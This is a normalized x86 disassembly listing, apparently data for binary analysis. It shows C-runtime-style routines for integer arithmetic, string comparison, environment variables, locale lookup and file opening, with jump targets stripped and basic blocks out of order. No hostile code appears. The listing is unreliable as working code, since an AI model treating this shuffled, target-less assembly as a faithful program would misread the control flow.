mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_44d523
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_44d470
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_44fe41
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_43f118
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_43f873
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
sub_44d5c0
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_44d6a0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_44d6c8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_450867
call sub_450867
mov [ esi ] eax
jmp r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
call sub_43f8c5
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_450867
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_44d727
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx ecx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
test edi edi
jle r-xdata
cmp edi 0xffffffff
jge r-xdata
mov ecx edi
mov esi [ ebp + 0x18 ]
test esi esi
jle r-xdata
xor eax eax
jmp r-xdata
or eax 0xffffffff
sub eax ecx
add edi eax
mov [ ebp + 0x14 ] edi
inc eax
test ecx ecx
jne r-xdata
cmp esi 0xffffffff
jl r-xdata
mov ecx esi
mov eax edx
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_437c1c
leave
retn
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
and [ ebp - 0x28 ] 0x0
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
or eax 0xffffffff
sub eax ecx
add esi eax
mov [ ebp + 0x18 ] esi
jmp r-xdata
inc eax
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
cmp edi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
inc ebx
cmp esi ebx
jle r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push edi
push [ ebp - 0x24 ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
cmp edi ebx
jle r-xdata
mov eax ebx
jmp r-xdata
mov edi 0x400
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x1c ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
test edi edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x1c ]
push [ ebp + 0x14 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
test esi esi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x1c ]
call sub_43df2c
mov eax [ ebp - 0x28 ]
pop ecx
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x20 ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_438337
pop ecx
test eax eax
je r-xdata
call sub_43b260
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x20 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x20 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_43df2c
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_438337
pop ecx
test eax eax
je r-xdata
call sub_43b260
mov eax esp
test eax eax
je r-xdata
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
add eax 0x8
sub_44d995
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
push [ ebp + 0x24 ]
mov edx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_44d727
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_44d9d7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_44d995
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44cf6b
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_43c04c
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_44dac1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_449510
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_44db13
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_43de17
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push 0x9
call sub_43b74c
and [ esi ] 0x0
mov eax [ ebp - 0x4 ]
pop esi
sub edi esi
push eax
call sub_450b79
mov [ esi ] eax
add esi 0x4
mov eax [ edi + esi ]
pop ecx
test eax eax
jne r-xdata
sub_44db73
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
call sub_43c04c
mov [ eax ] 0x16
push 0x3d
push esi
call sub_450c7b
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_44db13
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_44dac1
mov edi eax
pop ecx
cmp edi ebx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_43ddd2
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_44952a
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_4381f8
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_4381f8
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_43ddd2
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_43deb1
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_43deb1
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_43c860
pop ecx
add eax 0x2
push eax
call sub_43de17
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_4381f8
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_43c860
pop ecx
add eax 0x2
push eax
push edi
call sub_43f118
add esp 0xc
test eax eax
jne r-xdata
mov [ rw-data ] eax
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_43f873
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push edi
call sub_4381f8
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_43c04c
mov [ eax ] 0x2a
sub_44ddb5
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push ebx
push esi
push edi
mov edi [ GetLocaleInfoW@IAT ]
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call edi
mov ecx eax
mov [ ebp - 0xc ] ecx
cmp ecx esi
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_437c1c
leave
retn
push [ ebp - 0xc ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call edi
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_43df2c
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_438337
pop ecx
cmp eax esi
je r-xdata
call sub_43b260
mov ebx esp
cmp ebx esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov ebx eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebx ] 0xcccc
add ebx 0x8
jmp r-xdata
push 0xffffffff
push ebx
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp ebx esi
je r-xdata
sub_44de8f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_44ddb5
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_44dec9
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_450c92
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_44df0b
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
mov esi eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_43f873
int3
mov eax 0x8000
test [ ebp + 0x10 ] eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_43925e
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
and eax 0x3
sub eax ebx
mov ecx 0xc0000000
mov edx 0x80000000
je r-xdata
test [ ebp + 0x10 ] 0x74000
jne r-xdata
mov [ ebp - 0xc ] edx
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x24 ] eax
je r-xdata
mov [ ebp - 0x14 ] ebx
sub eax ecx
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
test [ ebp + 0x10 ] 0x70000
jne r-xdata
mov [ ebp - 0xc ] ecx
jmp r-xdata
call sub_43c05f
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
call sub_43f8c5
mov eax esi
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x18 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
push edi
mov edi 0x100
cmp eax ecx
jg r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x18 ] 0x5
jmp r-xdata
cmp eax edx
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
test eax 0x1000
je r-xdata
or [ ebp - 0x10 ] 0x4000000
or [ ebp - 0xc ] 0x10000
or [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] 0x1
call sub_43c05f
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
call sub_43f8c5
mov eax esi
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0xc ] edx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0x10 ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0x10 ] 0x8000000
jmp r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
call sub_442ed1
or ebx 0xffffffff
mov [ esi ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x10 ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push 0x0
push [ ebp - 0x10 ]
mov [ eax ] 0x1
push [ ebp - 0x18 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
call sub_43c05f
and [ eax ] 0x0
mov [ esi ] ebx
call sub_43c04c
mov [ eax ] 0x18
call sub_43c04c
mov eax [ eax ]
jmp r-xdata
push [ ebp - 0x20 ]
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
pop edi
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_43c072
pop ecx
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_43c072
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_43c04c
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_43c04c
mov [ eax ] 0xd
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x7fffffff
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x20 ]
push [ esi ]
call sub_442c9b
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
cmp [ ebp - 0x3 ] 0x0
mov [ eax ] cl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x24 ]
and eax edi
jne r-xdata
push 0x2
push ebx
push [ esi ]
call sub_440cbb
mov edi eax
add esp 0xc
cmp edi ebx
jne r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] 0x0
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] 0x0
call sub_4403c9
add esp 0xc
test eax eax
jne r-xdata
call sub_43c05f
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
and eax 0x7fffffff
push eax
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax ebx
jne r-xdata
xor edi edi
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x1c ] edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push 0x0
push 0x0
push [ esi ]
call sub_440cbb
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_440e04
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_43c072
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_442d1c
pop ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
